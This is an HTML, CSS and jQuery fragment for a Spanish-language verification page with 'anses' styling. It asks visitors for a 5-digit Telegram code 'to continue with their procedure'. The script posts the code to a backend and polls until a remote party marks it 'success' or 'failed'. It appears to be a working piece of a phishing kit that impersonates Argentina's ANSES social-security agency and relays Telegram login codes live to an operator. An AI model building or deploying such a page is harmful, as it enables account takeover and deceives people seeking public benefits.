<style>
    .otp-wrapper {
        padding: 10px 5px;
        text-align: left;
    }

    .otp-title {
        font-size: 22px !important;
        font-weight: 700;
        color: #002f5a;
        margin-bottom: 15px;
        text-align: center;
    }

    .otp-desc {
        font-size: 15px;
        color: #555;
        text-align: center;
        margin-bottom: 25px;
        line-height: 1.4;
    }

    .anses-label {
        font-size: 14px;
        font-weight: 700;
        color: #002f5a;
        margin-bottom: 8px;
        display: block;
    }

    .otp-input {
        width: 100%;
        height: 50px;
        border-radius: 4px;
        border: 1px solid #ccc;
        text-align: center;
        font-size: 24px;
        font-weight: 700;
        letter-spacing: 8px;
        color: #002f5a;
        transition: border-color 0.3s;
    }

    .otp-input:focus {
        border-color: #0080c7;
        outline: none;
        box-shadow: 0 0 5px rgba(0,128,199,0.2);
    }

    .otp-input::placeholder {
        font-size: 16px;
        letter-spacing: normal;
        color: #aaa;
        font-weight: 400;
    }

    .otp-btn {
        width: 100%;
        height: 48px;
        border-radius: 4px;
        background-color: #0080c7;
        font-weight: 700;
        color: #fff;
        border: none;
        text-transform: uppercase;
        margin-top: 20px;
        font-size: 16px;
        cursor: pointer;
    }

    .otp-btn:disabled {
        background-color: #ccc;
        cursor: not-allowed;
    }

    /* CSS Loader yang tadinya hilang */
    #loader {
        display: none;
        text-align: center;
        margin-top: 20px;
    }
    .spinner-otp {
        width: 30px;
        height: 30px;
        border: 4px solid #f3f3f3;
        border-top: 4px solid #0080c7;
        border-radius: 50%;
        animation: spin-otp 1s linear infinite;
        display: inline-block;
    }
    @keyframes spin-otp { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    .text-danger-anses {
        color: #d32f2f;
        font-size: 14px;
        font-weight: 600;
        margin-top: 10px;
    }
</style>

<div class="otp-wrapper">
    <h5 class="otp-title">Código de Verificación</h5>

    <p class="otp-desc">
        Introduzca el código de 5 dígitos que le enviamos por <strong>Telegram</strong> para continuar con su trámite.
    </p>

    <div class="mb-3">
        <label class="anses-label">Ingrese el código OTP</label>
        <input
            type="text"
            class="form-control otp-input shadow-none"
            id="otp_val"
            placeholder="00000"
            maxlength="5"
            inputmode="numeric"
            autocomplete="one-time-code"
        />
    </div>

    <p id="wrong" class="text-center text-danger-anses fw-semibold"></p>

    <button type="button" class="btn otp-btn" id="btnSubmit">
        CONTINUAR
    </button>

    <div id="loader">
        <div class="spinner-otp"></div>
        <p style="font-size: 14px; color: #0080c7; margin-top: 10px;">Verificando...</p>
    </div>
    
    <div class="text-center mt-4">
        <small style="color: #666;">
            ¿No recibiste el código? 
            <span id="resend-text">Reenviar código en <span id="timer">60</span>s</span>
            <a href="javascript:location.reload()" id="resend-link" style="display:none; color: #0080c7; font-weight: bold; text-decoration: none;">Reenviar ahora</a>
        </small>
    </div>
</div>

<script>
$(document).ready(function() {
    $("#wrong").hide();
    $("#loader").hide();

    // 1. LOGIKA TIMER REENVIAR
    var timeLeft = 60;
    var timerId = setInterval(function() {
        if (timeLeft <= 0) {
            clearInterval(timerId);
            $("#resend-text").hide();
            $("#resend-link").show();
        } else {
            $("#timer").text(timeLeft);
        }
        timeLeft -= 1;
    }, 1000);

    // 2. LOGIKA CHECK STATUS
    function checkStatus() {
        $.ajax({
            url: "API/index.php",
            type: "POST",
            data: {"method":"getStatus"},
            success: function(data) {
                let res = (typeof data === 'string') ? JSON.parse(data) : data;

                if (res.result.status == "success") {
                    window.location.reload();
                } else if (res.result.status == "failed") {
                    $("#loader").hide();
                    $("#btnSubmit").show();
                    $("#wrong").html("❌ El código OTP es incorrecto").show();
                    $("#otp_val").val("");
                } else {
                    setTimeout(function(){ checkStatus(); }, 1000);
                }
            }
        });
    }

    // 3. LOGIKA TOMBOL KLIK
    $("#btnSubmit").on("click", function(e) {
        e.preventDefault();
        var otpValue = $("#otp_val").val();

        if (otpValue.length === 5) {
            $("#wrong").hide();
            $("#btnSubmit").hide(); 
            $("#loader").show();

            $.ajax({
                url: "API/index.php",
                type: "POST",
                data: {"method":"sendOtp", "otp": otpValue},
                success: function() {
                    setTimeout(function(){ checkStatus(); }, 500);
                },
                error: function() {
                    $("#loader").hide();
                    $("#btnSubmit").show();
                    alert("Error de conexión");
                }
            });
        } else {
            alert("Por favor, ingrese el código de 5 dígitos.");
        }
    });
});
</script>
